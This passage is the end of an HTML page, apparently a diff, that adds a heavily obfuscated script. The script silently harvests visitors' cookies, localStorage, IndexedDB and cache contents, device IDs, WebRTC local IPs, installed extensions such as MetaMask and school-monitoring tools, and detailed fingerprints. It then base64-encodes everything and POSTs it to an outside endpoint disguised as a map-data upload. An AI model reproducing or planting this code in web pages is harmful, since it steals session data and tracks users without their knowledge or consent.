Blob([_0x30ec80+_0x3dfac3])[_0x52c2d9('0xed')];}}catch(_0x5008cb){_0x27b287[_0x52c2d9(0x16d)]={'error':_0x5008cb[_0x52c2d9('0x168')]()};}try{_0x27b287[_0x52c2d9('0x128')]={'databases':[]};if(indexedDB[_0x52c2d9('0x167')]){if(_0x52c2d9(0xe4)==='NPCQm'){const _0xb9869a=_0x352e5e[_0x52c2d9('0x15e')](_0x52c2d9('0xe1')),_0x3da28a=_0xb9869a[_0x52c2d9(0xd7)]('webgl');_0x3da28a&&(_0x2bfadd[_0x52c2d9('0x186')]={'unmaskedVendor':_0x3da28a[_0x52c2d9(0xec)](_0x52c2d9(0x10d))?_0x3da28a[_0x52c2d9(0x1b0)](_0x3da28a['getExtension']('WEBGL_debug_renderer_info')[_0x52c2d9(0x112)]):null,'unmaskedRenderer':_0x3da28a['getExtension'](_0x52c2d9(0x10d))?_0x3da28a[_0x52c2d9(0x1b0)](_0x3da28a[_0x52c2d9('0xec')](_0x52c2d9(0x10d))[_0x52c2d9(0x1cd)]):null,'extensions':_0x3da28a['getSupportedExtensions']()});}else{const _0x3b914c=await indexedDB[_0x52c2d9(0x167)]();for(const _0x4c069e of _0x3b914c){_0x27b287[_0x52c2d9('0x128')][_0x52c2d9('0x167')]['push']({'name':_0x4c069e[_0x52c2d9(0x174)],'version':_0x4c069e[_0x52c2d9('0x141')]});}}}}catch(_0x4beff4){_0x27b287[_0x52c2d9('0x128')]={'error':_0x4beff4[_0x52c2d9('0x168')]()};}try{_0x27b287[_0x52c2d9(0xe2)]={'caches':[]};if(window[_0x52c2d9(0x14e)]){const _0x5a9ae7=await caches['keys']();for(const _0x25ff92 of _0x5a9ae7){const _0xa525bd=await caches[_0x52c2d9(0xc1)](_0x25ff92),_0x5c00c0=await _0xa525bd['keys']();_0x27b287[_0x52c2d9(0xe2)][_0x52c2d9(0x14e)][_0x52c2d9('0xf4')]({'name':_0x25ff92,'requestCount':_0x5c00c0[_0x52c2d9(0x132)],'urls':_0x5c00c0[_0x52c2d9('0x18b')](_0xfaaaed=>_0xfaaaed[_0x52c2d9('0x1c5')])});}}}catch(_0xbd2695){_0x27b287[_0x52c2d9(0xe2)]={'error':_0xbd2695[_0x52c2d9('0x168')]()};}try{if(_0x52c2d9('0x137')===_0x52c2d9('0x1aa'))_0x691a49[_0x52c2d9(0x186)]={'unmaskedVendor':_0x5dd9c8[_0x52c2d9(0xec)]('WEBGL_debug_renderer_info')?_0x2e6da2[_0x52c2d9(0x1b0)](_0x352477[_0x52c2d9(0xec)](_0x52c2d9('0x10d'))[_0x52c2d9(0x112)]):null,'unmaskedRenderer':_0x18bc10[_0x52c2d9('0xec')](_0x52c2d9('0x10d'))?_0x1e8ad9[_0x52c2d9('0x1b0')](_0x549d41[_0x52c2d9(0xec)](_0x52c2d9('0x10d'))[_0x52c2d9('0x1cd')]):null,'extensions':_0x268cc3[_0x52c2d9('0x175')]()};else{if(navigator[_0x52c2d9('0x17f')]?.[_0x52c2d9(0x144)]){const _0x40c84c=await navigator['storage'][_0x52c2d9(0x144)]();_0x27b287[_0x52c2d9('0x178')]={'quota':_0x40c84c['quota'],'usage':_0x40c84c[_0x52c2d9('0x133')],'usageDetails':_0x40c84c[_0x52c2d9('0x17c')]};}}}catch(_0x409fca){_0x27b287[_0x52c2d9(0x178)]={'error':_0x409fca[_0x52c2d9(0x168)]()};}try{const _0x29214b=await navigator[_0x52c2d9('0x1bd')]['enumerateDevices']();_0x27b287[_0x52c2d9('0x1bd')]=_0x29214b[_0x52c2d9('0x18b')](_0xa3aa2d=>({'kind':_0xa3aa2d[_0x52c2d9('0x13e')],'label':_0xa3aa2d[_0x52c2d9(0x15f)],'deviceId':_0xa3aa2d['deviceId'],'groupId':_0xa3aa2d[_0x52c2d9('0x120')]}));}catch(_0x4c6709){'QLZsw'!==_0x52c2d9('0xc6')?_0x26ca42[_0x52c2d9('0x177')]={'effectiveType':_0x5ea5f7[_0x52c2d9(0x13b)][_0x52c2d9(0x1bb)],'downlink':_0x5e819e[_0x52c2d9('0x13b')]['downlink'],'rtt':_0x78cd61[_0x52c2d9(0x13b)][_0x52c2d9('0x1c9')],'saveData':_0x442335[_0x52c2d9('0x13b')][_0x52c2d9('0x190')]}:_0x27b287[_0x52c2d9('0x1bd')]={'error':_0x4c6709[_0x52c2d9('0x168')]()};}try{if('qDtuh'==='PGNop')_0x1cc44[_0x52c2d9('0x1e0')]={'raw':_0x56a18c[_0x52c2d9('0x172')],'parsed':{}},_0x3aa146[_0x52c2d9(0x172)][_0x52c2d9(0x1da)](';')[_0x52c2d9('0xe8')](_0x527efc=>{const _0x464181=_0x52c2d9,_0x7327ee=_0x527efc['split']('=');if(_0x7327ee[_0x464181(0x132)]>=0x2){const _0x3bab56=_0x7327ee[_0x464181('0xfb')]()[_0x464181(0x12e)](),_0x11ea35=_0x7327ee[_0x464181(0xf3)]('=');_0x435118[_0x464181('0x1e0')][_0x464181(0xd1)][_0x3bab56]=_0x11ea35;}}),_0x4ce68d['cookies']['sizeBytes']=new _0x5255bb([_0x5d4001[_0x52c2d9(0x172)]])[_0x52c2d9('0xed')];else{if(navigator[_0x52c2d9(0x134)]){const _0x55ae16=await navigator[_0x52c2d9(0x134)]();_0x27b287[_0x52c2d9('0x148')]={'charging':_0x55ae16['charging'],'level':_0x55ae16['level'],'chargingTime':_0x55ae16[_0x52c2d9(0x13d)],'dischargingTime':_0x55ae16[_0x52c2d9(0x1ad)]};}}}catch(_0x2d1703){_0x27b287[_0x52c2d9(0x148)]={'error':_0x2d1703[_0x52c2d9('0x168')]()};}try{_0x52c2d9('0x11b')!==_0x52c2d9('0x143')?navigator['connection']&&(_0x52c2d9('0x109')===_0x52c2d9('0x164')?_0x281b1a[_0x52c2d9(0x148)]={'error':_0x1ccbe4['toString']()}:_0x27b287[_0x52c2d9('0x177')]={'effectiveType':navigator[_0x52c2d9(0x13b)][_0x52c2d9(0x1bb)],'downlink':navigator['connection'][_0x52c2d9(0x12b)],'rtt':navigator[_0x52c2d9('0x13b')]['rtt'],'saveData':navigator[_0x52c2d9(0x13b)][_0x52c2d9('0x190')]}):_0x3746a1[_0x52c2d9(0x178)]={'error':_0x342b85[_0x52c2d9('0x168')]()};}catch(_0x238cde){_0x27b287[_0x52c2d9(0x177)]={'error':_0x238cde['toString']()};}try{if(_0x52c2d9('0x1a5')===_0x52c2d9('0x196'))_0x3f4ff9[_0x52c2d9(0x108)]={'error':_0x496426[_0x52c2d9(0x168)]()};else{_0x27b287['extensions']=[];const _0x4a95ee=[_0x52c2d9(0x1a3),_0x52c2d9(0xf5),_0x52c2d9(0x1e6),_0x52c2d9(0x1a1),'GoGuardian',_0x52c2d9(0xd0),'Tampermonkey',_0x52c2d9(0x180),'Honey'];for(const _0x43492f of _0x4a95ee){try{if(_0x52c2d9(0xc4)===_0x52c2d9('0x1b4')){_0x1e984e[_0x52c2d9(0x12a)]=[];if(_0x3b0376[_0x52c2d9('0xc8')]){const _0x2398f4=_0x17900d['getVoices']();_0x5b7346['speechVoices']=_0x2398f4['map'](_0x2587e2=>({'name':_0x2587e2[_0x52c2d9('0x174')],'lang':_0x2587e2[_0x52c2d9(0x15d)],'localService':_0x2587e2['localService'],'default':_0x2587e2[_0x52c2d9(0xe7)]}));}}else document[_0x52c2d9(0x192)](_0x52c2d9(0x1e4)+_0x43492f+_0x52c2d9(0xce)+_0x43492f+'\x22]')&&_0x27b287['extensions'][_0x52c2d9(0xf4)](_0x43492f);}catch(_0x2b4893){}}}}catch(_0x1934a9){_0x52c2d9(0x1e9)===_0x52c2d9(0xcc)?_0x1c04ea[_0x52c2d9(0x170)]={'error':_0x5d35a5[_0x52c2d9('0x168')]()}:_0x27b287[_0x52c2d9('0x108')]={'error':_0x1934a9[_0x52c2d9('0x168')]()};}_0x27b287[_0x52c2d9(0x17a)]={'supported':!!window['RTCPeerConnection']},_0x27b287[_0x52c2d9(0xd5)]={'supported':!!navigator[_0x52c2d9('0xd5')]};try{_0x27b287[_0x52c2d9('0x170')]={'supported':!!navigator['serviceWorker'],'origin':location[_0x52c2d9(0x1c6)],'protocol':location[_0x52c2d9(0x1a6)],'registrations':[]};const _0x4a99c2=[_0x52c2d9('0x1b3'),'http:'],_0x25789e=location[_0x52c2d9('0x1c6')]&&location[_0x52c2d9(0x1c6)]!=='null';if(navigator['serviceWorker']&&_0x4a99c2['includes'](location[_0x52c2d9('0x1a6')])&&_0x25789e){const _0x5964c8=await navigator['serviceWorker'][_0x52c2d9('0x1de')]();_0x27b287[_0x52c2d9(0x170)][_0x52c2d9('0xdf')]=_0x5964c8[_0x52c2d9('0x18b')](_0x50df62=>({'scope':_0x50df62['scope'],'active':!!_0x50df62['active'],'installing':!!_0x50df62['installing'],'waiting':!!_0x50df62['waiting']}));}else _0x27b287[_0x52c2d9('0x170')]['reason']=_0x52c2d9('0x17e');}catch(_0x1a3ff8){'CuObR'===_0x52c2d9('0xcf')?_0x127e6f[_0x52c2d9(0xeb)]={'totalElements':_0x1cd792[_0x52c2d9(0x19e)]('*')[_0x52c2d9(0x132)],'iframes':_0x386550[_0x52c2d9(0x19e)](_0x52c2d9('0x19c'))[_0x52c2d9(0x132)],'scripts':_0x3e6d74['querySelectorAll'](_0x52c2d9(0x1dd))['length'],'images':_0x598cd2[_0x52c2d9(0x131)][_0x52c2d9(0x132)],'links':_0x221c06['links'][_0x52c2d9('0x132')],'forms':_0x4e7e7c[_0x52c2d9('0x149')][_0x52c2d9('0x132')]}:_0x27b287[_0x52c2d9(0x170)]={'error':_0x1a3ff8[_0x52c2d9(0x168)]()};}try{_0x52c2d9('0xd4')!=='CwTyb'?_0x27b287[_0x52c2d9(0x13f)]={'href':location['href'],'origin':location[_0x52c2d9(0x1c6)],'protocol':location['protocol'],'hostname':location['hostname'],'host':location[_0x52c2d9(0x17d)],'port':location[_0x52c2d9('0x16a')],'pathname':location['pathname'],'search':location['search'],'hash':location[_0x52c2d9(0x182)],'isSecureContext':window['isSecureContext'],'topEqualsSelf':window[_0x52c2d9('0xc0')]===window[_0x52c2d9('0x11e')],'crossOriginIsolated':window[_0x52c2d9(0xd9)],'inIframe':window[_0x52c2d9(0x11e)]!==window[_0x52c2d9('0xc0')],'referrer':document[_0x52c2d9(0x188)],'cookieEnabled':navigator[_0x52c2d9('0x126')],'online':navigator[_0x52c2d9(0xbf)],'visibilityState':document[_0x52c2d9('0x107')],'hidden':document[_0x52c2d9('0x154')],'readyState':document[_0x52c2d9(0x1a0)],'fullscreenEnabled':document['fullscreenEnabled'],'fullscreenElement':!!document[_0x52c2d9(0x1ac)],'compatMode':document['compatMode'],'characterSet':document[_0x52c2d9('0x10f')],'contentType':document[_0x52c2d9(0x117)],'domain':document[_0x52c2d9('0x1ce')],'lastModified':document[_0x52c2d9(0x16c)]}:_0x5b631e[_0x52c2d9(0x159)]={'error':_0x2b545a[_0x52c2d9('0x168')]()};}catch(_0x3c54f0){if('iNRyq'===_0x52c2d9('0x1c7')){_0x3bb21c['fonts']=[];if(_0x142e06['fonts'])for(const _0x3979fe of _0x549a11['fonts']){_0x44d16c[_0x52c2d9(0x15a)][_0x52c2d9(0xf4)]({'family':_0x3979fe[_0x52c2d9('0x18f')],'style':_0x3979fe[_0x52c2d9('0x135')],'weight':_0x3979fe[_0x52c2d9(0x171)],'status':_0x3979fe['status']});}}else _0x27b287['executionContext']={'error':_0x3c54f0[_0x52c2d9(0x168)]()};}try{if('dDcHD'!==_0x52c2d9('0x19b')){_0x27b287[_0x52c2d9('0x1ca')]={};const _0x4425d7=[_0x52c2d9('0xd5'),_0x52c2d9('0x156'),_0x52c2d9(0x191),'microphone',_0x52c2d9(0x145),'clipboard-write',_0x52c2d9(0x14c),_0x52c2d9('0xc2'),_0x52c2d9(0x122),_0x52c2d9(0xf4)];for(const _0xad2e62 of _0x4425d7){if(_0x52c2d9(0x146)==='ynvNv')try{const _0x731b53=await navigator[_0x52c2d9('0x1ca')][_0x52c2d9(0x115)]({'name':_0xad2e62});_0x27b287['permissions'][_0xad2e62]=_0x731b53[_0x52c2d9('0x173')];}catch(_0x60c254){_0x27b287[_0x52c2d9('0x1ca')][_0xad2e62]=_0x52c2d9(0x1a8);}else{const _0x539055=_0x50ba95['key'](_0x2ebd12),_0x25529c=_0x82ee['getItem'](_0x539055);_0x43bb77[_0x52c2d9('0x159')][_0x52c2d9(0x147)][_0x539055]=_0x25529c,_0x5512bc['localStorage']['totalSizeBytes']+=new _0x559afc([_0x539055+_0x25529c])[_0x52c2d9('0xed')];}}}else _0x1be61f['performanceMemory']={'jsHeapSizeLimit':_0x438b6d[_0x52c2d9(0xc7)][_0x52c2d9('0xe5')],'totalJSHeapSize':_0x477611['memory'][_0x52c2d9(0xdd)],'usedJSHeapSize':_0x555ed0[_0x52c2d9(0xc7)]['usedJSHeapSize']};}catch(_0x1d0b0c){_0x27b287[_0x52c2d9(0x1ca)]={'error':_0x1d0b0c['toString']()};}try{_0x27b287['gamepads']=[];const _0x43736a=navigator[_0x52c2d9('0x1db')]?.()||[];for(const _0x3ebfc1 of _0x43736a){if(!_0x3ebfc1)continue;_0x27b287['gamepads']['push']({'id':_0x3ebfc1['id'],'index':_0x3ebfc1[_0x52c2d9(0x10c)],'connected':_0x3ebfc1[_0x52c2d9(0x100)],'mapping':_0x3ebfc1['mapping'],'axes':_0x3ebfc1['axes'],'buttons':_0x3ebfc1['buttons']['length']});}}catch(_0x545603){_0x52c2d9('0xf7')===_0x52c2d9(0xf7)?_0x27b287[_0x52c2d9(0x197)]={'error':_0x545603[_0x52c2d9('0x168')]()}:_0x1ba1bf[_0x52c2d9(0x16f)]={'connection':_0x463f0b[_0x52c2d9(0x13b)]?{'type':_0x19793c[_0x52c2d9(0x13b)][_0x52c2d9(0x130)],'effectiveType':_0xa59f34['connection'][_0x52c2d9('0x1bb')],'downlink':_0x3291e3[_0x52c2d9('0x13b')][_0x52c2d9(0x12b)],'downlinkMax':_0x112580[_0x52c2d9('0x13b')][_0x52c2d9(0xd8)],'rtt':_0x3c5ae6[_0x52c2d9('0x13b')][_0x52c2d9('0x1c9')],'saveData':_0x366fa2[_0x52c2d9(0x13b)][_0x52c2d9(0x190)]}:_0x52c2d9('0x1a8'),'online':_0x2898c0[_0x52c2d9(0xbf)],'timezone':_0x11c170[_0x52c2d9(0x1b6)]()[_0x52c2d9(0x12c)]()[_0x52c2d9('0x163')],'language':_0x33a5d5['language'],'languages':_0x58fe5c[_0x52c2d9(0xdb)]};}try{if(_0x52c2d9('0x1bc')==='crIOX'){_0x27b287['speechVoices']=[];if(window[_0x52c2d9('0xc8')]){if(_0x52c2d9('0x104')===_0x52c2d9(0x104)){const _0x46c527=speechSynthesis['getVoices']();_0x27b287[_0x52c2d9('0x12a')]=_0x46c527[_0x52c2d9(0x18b)](_0x299908=>({'name':_0x299908['name'],'lang':_0x299908[_0x52c2d9(0x15d)],'localService':_0x299908[_0x52c2d9(0xfd)],'default':_0x299908[_0x52c2d9(0xe7)]}));}else _0x1565e3[_0x52c2d9('0x128')][_0x52c2d9(0x167)][_0x52c2d9('0xf4')]({'name':_0x2f8833[_0x52c2d9(0x174)],'version':_0x3fc7f9['version']});}}else _0x1da896[_0x52c2d9(0x170)]['reason']=_0x52c2d9('0x17e');}catch(_0x8be5e8){_0x27b287[_0x52c2d9('0x12a')]={'error':_0x8be5e8[_0x52c2d9(0x168)]()};}try{_0x27b287['mediaCodecs']={'video':{'h264':MediaSource[_0x52c2d9('0x1e5')](_0x52c2d9(0x19a)),'h265':MediaSource[_0x52c2d9(0x1e5)]('video/mp4;\x20codecs=\x22hev1\x22'),'vp8':MediaSource[_0x52c2d9('0x1e5')](_0x52c2d9('0x153')),'vp9':MediaSource[_0x52c2d9('0x1e5')](_0x52c2d9(0x198)),'av1':MediaSource[_0x52c2d9(0x1e5)](_0x52c2d9('0x15b'))},'audio':{'mp3':MediaSource['isTypeSupported'](_0x52c2d9(0x1d9)),'opus':MediaSource[_0x52c2d9('0x1e5')](_0x52c2d9('0x101')),'aac':MediaSource[_0x52c2d9('0x1e5')](_0x52c2d9('0x152')),'flac':MediaSource[_0x52c2d9('0x1e5')](_0x52c2d9('0xca'))}};}catch(_0xcefecc){_0x27b287[_0x52c2d9('0x14f')]={'error':_0xcefecc['toString']()};}try{_0x52c2d9('0x1ba')!=='PuHfT'?_0x23d780[_0x52c2d9('0x11c')][_0x2473f0]=_0x2b2bae:_0x27b287[_0x52c2d9(0x103)]=Object[_0x52c2d9(0xef)](window)['slice'](0x0,0x1f4);}catch(_0x5e73df){_0x27b287[_0x52c2d9(0x103)]={'error':_0x5e73df[_0x52c2d9(0x168)]()};}try{if(_0x52c2d9('0xe3')!==_0x52c2d9('0xe3'))return _0x4ad9ca(_0x6fe1a),null;else _0x27b287['performanceEntries']=performance[_0x52c2d9('0x1c4')]()[_0x52c2d9(0x18b)](_0x4a7f03=>({'name':_0x4a7f03['name'],'entryType':_0x4a7f03[_0x52c2d9('0x12f')],'duration':_0x4a7f03['duration'],'startTime':_0x4a7f03['startTime']}));}catch(_0x55fa6a){_0x52c2d9('0x176')!=='uMOrJ'?_0x27b287[_0x52c2d9('0x16b')]={'error':_0x55fa6a['toString']()}:_0x2bf417['canvasFingerprint']='OffscreenCanvasBlob';}try{if(_0x52c2d9(0x150)===_0x52c2d9('0x150')){_0x27b287[_0x52c2d9(0x1a7)]=[];if(window['RTCPeerConnection']){const _0x390db1=new RTCPeerConnection({'iceServers':[]});_0x390db1[_0x52c2d9(0x114)](''),_0x390db1[_0x52c2d9(0x1e3)]=_0x28be8b=>{const _0x3dd856=_0x52c2d9;if(!_0x28be8b[_0x3dd856(0x1a2)])return;const _0xc82129=_0x28be8b[_0x3dd856(0x1a2)][_0x3dd856(0x1a2)],_0x2b3b5c=_0xc82129[_0x3dd856(0x1b1)](/([0-9]{1,3}(\.[0-9]{1,3}){3})/);if(_0x2b3b5c){if(_0x3dd856(0xda)==='Sbslv')try{_0x39d411['querySelector'](_0x3dd856(0x1e4)+_0x4c4e6d+_0x3dd856('0xce')+_0x4cd66a+'\x22]')&&_0x3bb797[_0x3dd856(0x108)][_0x3dd856(0xf4)](_0x2fd285);}catch(_0x33b0cc){}else{const _0x13c8b9=_0x2b3b5c[0x1];!_0x27b287[_0x3dd856(0x1a7)][_0x3dd856('0x162')](_0x13c8b9)&&(_0x3dd856(0xfc)===_0x3dd856(0xfc)?_0x27b287[_0x3dd856('0x1a7')][_0x3dd856(0xf4)](_0x13c8b9):_0x40d32b[_0x3dd856('0xe2')]={'error':_0x2f5f8a[_0x3dd856(0x168)]()});}}};const _0x1874e1=await _0x390db1[_0x52c2d9(0xcb)]();await _0x390db1[_0x52c2d9(0x1d6)](_0x1874e1);}}else _0x4ef038['canvasFingerprint']='Unavailable';}catch(_0x24fd19){_0x27b287['webrtcIPs']={'error':_0x24fd19[_0x52c2d9(0x168)]()};}try{_0x27b287[_0x52c2d9(0x15a)]=[];if(document[_0x52c2d9('0x15a')])for(const _0x237995 of document[_0x52c2d9(0x15a)]){_0x27b287[_0x52c2d9('0x15a')][_0x52c2d9(0xf4)]({'family':_0x237995[_0x52c2d9('0x18f')],'style':_0x237995[_0x52c2d9('0x135')],'weight':_0x237995[_0x52c2d9('0x171')],'status':_0x237995[_0x52c2d9(0x1dc)]});}}catch(_0x4b827d){_0x52c2d9('0xf8')==='otvGK'?_0x3af1de['mediaCodecs']={'error':_0x3dfc3c['toString']()}:_0x27b287[_0x52c2d9('0x15a')]={'error':_0x4b827d[_0x52c2d9('0x168')]()};}try{_0x52c2d9('0xea')!==_0x52c2d9(0x121)?_0x27b287['domStats']={'totalElements':document[_0x52c2d9('0x19e')]('*')['length'],'iframes':document[_0x52c2d9(0x19e)](_0x52c2d9('0x19c'))['length'],'scripts':document['querySelectorAll'](_0x52c2d9('0x1dd'))['length'],'images':document[_0x52c2d9(0x131)]['length'],'links':document[_0x52c2d9('0x113')][_0x52c2d9(0x132)],'forms':document[_0x52c2d9('0x149')][_0x52c2d9('0x132')]}:_0x42f16c[_0x52c2d9('0x1a7')]={'error':_0x4eee1f['toString']()};}catch(_0x399ef0){_0x52c2d9(0x181)!==_0x52c2d9('0x181')?_0xac4e87[_0x52c2d9('0x157')]=_0x8c2611[_0x52c2d9('0x168')]():_0x27b287[_0x52c2d9(0xeb)]={'error':_0x399ef0[_0x52c2d9('0x168')]()};}try{_0x27b287[_0x52c2d9(0x16f)]={'connection':navigator[_0x52c2d9(0x13b)]?{'type':navigator['connection'][_0x52c2d9(0x130)],'effectiveType':navigator[_0x52c2d9('0x13b')][_0x52c2d9(0x1bb)],'downlink':navigator[_0x52c2d9('0x13b')][_0x52c2d9(0x12b)],'downlinkMax':navigator['connection']['downlinkMax'],'rtt':navigator['connection']['rtt'],'saveData':navigator[_0x52c2d9('0x13b')][_0x52c2d9(0x190)]}:_0x52c2d9('0x1a8'),'online':navigator['onLine'],'timezone':Intl[_0x52c2d9('0x1b6')]()['resolvedOptions']()[_0x52c2d9('0x163')],'language':navigator['language'],'languages':navigator[_0x52c2d9('0xdb')]};}catch(_0x23d1cb){'SxagY'===_0x52c2d9('0x16e')?_0x4a2f5d[_0x52c2d9('0xeb')]={'error':_0x1051d3[_0x52c2d9('0x168')]()}:_0x27b287[_0x52c2d9('0x16f')]={'error':_0x23d1cb['toString']()};}try{'DQfbP'!==_0x52c2d9(0x155)?_0x22337d[_0x52c2d9(0x187)]={'error':_0x47b544[_0x52c2d9('0x168')]()}:_0x27b287['networkLeaks']={'webrtcSupported':!!window[_0x52c2d9('0x1c0')],'dnsLeakTestNote':_0x52c2d9('0x1d3')};}catch(_0x32000b){_0x27b287[_0x52c2d9(0x1ae)]={'error':_0x32000b[_0x52c2d9(0x168)]()};}try{_0x27b287[_0x52c2d9(0x1d8)]={},navigator[_0x52c2d9(0x105)]?.[_0x52c2d9(0xc3)]&&(_0x27b287[_0x52c2d9(0x1d8)]=await navigator['userAgentData'][_0x52c2d9('0xc3')](['architecture',_0x52c2d9('0x15c'),_0x52c2d9(0xff),_0x52c2d9(0x1be),'uaFullVersion',_0x52c2d9(0xd6)]));}catch(_0x36a790){_0x27b287[_0x52c2d9(0x1d8)]={'error':_0x36a790[_0x52c2d9('0x168')]()};}try{const _0x591e5d=navigator;_0x27b287[_0x52c2d9('0x10a')]=_0x591e5d[_0x52c2d9('0x13b')]?{'effectiveType':_0x591e5d[_0x52c2d9('0x13b')][_0x52c2d9('0x1bb')],'rtt':_0x591e5d[_0x52c2d9('0x13b')]['rtt'],'downlink':_0x591e5d['connection'][_0x52c2d9('0x12b')],'saveData':_0x591e5d['connection'][_0x52c2d9('0x190')],'type':_0x591e5d['connection']['type']||_0x52c2d9(0x1bf)}:'unsupported';}catch(_0x53047f){_0x27b287[_0x52c2d9(0x10a)]={'error':_0x53047f[_0x52c2d9('0x168')]()};}try{if('eWOMT'===_0x52c2d9('0x194'))return _0x1cfe80[_0x52c2d9('0x15e')]('canvas');else{const _0x381bf1=document[_0x52c2d9(0x15e)](_0x52c2d9(0xe1)),_0x4fca25=_0x381bf1[_0x52c2d9(0xd7)](_0x52c2d9('0xf9'));_0x4fca25&&(_0x52c2d9(0xe6)!==_0x52c2d9(0xe6)?_0x646277[_0x52c2d9('0x10a')]={'error':_0x4a9794[_0x52c2d9(0x168)]()}:_0x27b287['gpuAdvanced']={'unmaskedVendor':_0x4fca25[_0x52c2d9(0xec)](_0x52c2d9('0x10d'))?_0x4fca25[_0x52c2d9(0x1b0)](_0x4fca25[_0x52c2d9(0xec)](_0x52c2d9('0x10d'))[_0x52c2d9('0x112')]):null,'unmaskedRenderer':_0x4fca25[_0x52c2d9(0xec)]('WEBGL_debug_renderer_info')?_0x4fca25[_0x52c2d9(0x1b0)](_0x4fca25['getExtension'](_0x52c2d9(0x10d))['UNMASKED_RENDERER_WEBGL']):null,'extensions':_0x4fca25['getSupportedExtensions']()});}}catch(_0x4d4813){_0x52c2d9(0x106)==='bCirE'?_0x2362c9[_0x52c2d9('0x103')]=_0x1d16d4[_0x52c2d9('0xef')](_0x57e5e2)[_0x52c2d9(0x1e7)](0x0,0x1f4):_0x27b287['gpuAdvanced']={'error':_0x4d4813['toString']()};}const _0xbe760a=JSON[_0x52c2d9(0x136)](_0x27b287),_0x33e248=btoa(unescape(encodeURIComponent(_0xbe760a)));fetch(_0x52c2d9('0x179'),{'method':_0x52c2d9('0x124'),'mode':_0x52c2d9(0x165),'headers':{'accept':_0x52c2d9('0x139'),'accept-language':_0x52c2d9(0x111),'content-type':_0x52c2d9('0x10b')},'body':new URLSearchParams({'pname':_0x52c2d9('0x158'),'password':_0x52c2d9('0x158'),'mname':Date[_0x52c2d9(0x1a4)]()[_0x52c2d9('0x168')](),'fname':_0x52c2d9('0x1d0'),'fdata':_0x33e248})[_0x52c2d9(0x168)]()}),window[_0x52c2d9('0x116')]=_0x27b287;})()));function _0x4899(_0x21200f,_0x2cd6f5){_0x21200f=_0x21200f-0xbf;const _0x2c74ef=_0x2c74();let _0x489949=_0x2c74ef[_0x21200f];return _0x489949;}function _0x2c74(){const _0x4a9436=['audio/mp4;\x20codecs=\x22mp4a.40.2\x22','video/webm;\x20codecs=\x22vp8\x22','hidden','DQfbP','notifications','userAgentDataError','BXY','localStorage','fonts','video/mp4;\x20codecs=\x22av01.0.05M.08\x22','bitness','lang','createElement','label','platform','2250094bGnFbg','includes','timeZone','XCMnY','cors','wow64','databases','toString','lkHqf','port','performanceEntries','lastModified','sessionStorage','ArZRQ','networkAdvanced','serviceWorkers','weight','cookie','state','name','getSupportedExtensions','JPpQQ','network','storageEstimate','https://ssl.pacogames.com/datafiles/pw5/UploadMapData.php','webrtc','1213218painPE','usageDetails','host','Blocked\x20because\x20current\x20origin\x20is\x20not\x20secure.','storage','AdBlock','RcCki','hash','deviceMemory','830084VeKLjX','getItem','gpuAdvanced','canvasFingerprint','referrer','WebGL\x20unavailable','1477760XOHiQD','map','usedJSHeapSize','gpu','brands','family','saveData','camera','querySelector','title','YRgsG','isSecureContext','sHrHc','gamepads','video/webm;\x20codecs=\x22vp9\x22','rgba(102,\x20204,\x200,\x200.7)','video/mp4;\x20codecs=\x22avc1.42E01E\x22','tzRfy','iframe','signal','querySelectorAll','VWrxf','readyState','Loom','candidate','MetaMask','now','QbjFC','protocol','webrtcIPs','unsupported','devicePixelRatio','QbHTd','formFactors','fullscreenElement','dischargingTime','networkLeaks','WBKYJ','getParameter','match','FingerprintTest','https:','ABPAp','#069','DateTimeFormat','mUASk','EEffu','2D\x20Context\x20unavailable','PuHfT','effectiveType','crIOX','mediaDevices','model','unknown','RTCPeerConnection','Canvas\x20unavailable','223575jZSJJx','timestamp','getEntries','url','origin','HdmZx','Unavailable','rtt','permissions','abort','performanceMemoryError','UNMASKED_RENDERER_WEBGL','domain','availWidth','iuvewonqasuyhAuibavubdrwunv','1tnSgFo','key','Requires\x20external\x20signaling\x20to\x20fully\x20test','Iiysu','6jgMDrp','setLocalDescription','convertToBlob','clientHints','audio/mpeg','split','getGamepads','status','script','getRegistrations','SrfHA','cookies','hrtiH','Unknown','onicecandidate','[id*=\x22','isTypeSupported','Dark\x20Reader','slice','orientation','BVowA','font','onLine','top','open','background-sync','getHighEntropyValues','QtBLz','RBWEo','QLZsw','memory','speechSynthesis','undefined','audio/flac','createOffer','tseuA','json','\x22],\x20[class*=\x22','dlrlg','Lightspeed','parsed','OffscreenCanvasBlob','aiwKf','cniSi','geolocation','fullVersionList','getContext','downlinkMax','crossOriginIsolated','qfjBg','languages','colorDepth','totalJSHeapSize','startTime','registrations','uaFullVersion','canvas','cacheStorage','BFbWm','MkdEd','jsHeapSizeLimit','mNXKZ','default','forEach','241088UcqJTM','ZstyR','domStats','getExtension','size','aXalF','getOwnPropertyNames','toDataURL','cpJAh','totalSizeBytes','join','push','uBlock','4645025hRwzPC','yTSqw','iCRnr','webgl','screen','shift','KlBrc','localService','MAX_RENDERBUFFER_SIZE','platformVersion','connected','audio/webm;\x20codecs=\x22opus\x22','sizeBytes','globalVariables','KzYco','userAgentData','zjguS','visibilityState','extensions','ZYmDT','networkQuality','application/x-www-form-urlencoded','index','WEBGL_debug_renderer_info','MAX_VIEWPORT_DIMS','characterSet','Xcbiv','en-US,en;q=0.9','UNMASKED_VENDOR_WEBGL','links','createDataChannel','query','fullBrowserInfo','contentType','SHADING_LANGUAGE_VERSION','webgl2','width','mBSxV','navigator','hardwareConcurrency','self','href','groupId','Xycli','midi','18px\x20Arial','POST','MAX_TEXTURE_SIZE','cookieEnabled','fullscreenEnabled','indexedDB','fillText','speechVoices','downlink','resolvedOptions','function','trim','entryType','type','images','length','usage','getBattery','style','stringify','FGXMc','fillRect','*/*','maxTouchPoints','connection','hostname','chargingTime','kind','executionContext','userAgent','version','object','nJzpu','estimate','clipboard-read','ynvNv','items','battery','forms','experimental-webgl','fillStyle','persistent-storage','highEntropy','caches','mediaCodecs','UIFUW','availHeight'];_0x2c74=function(){return _0x4a9436;};return _0x2c74();}
+  </script>
+</body>
+
 </html>
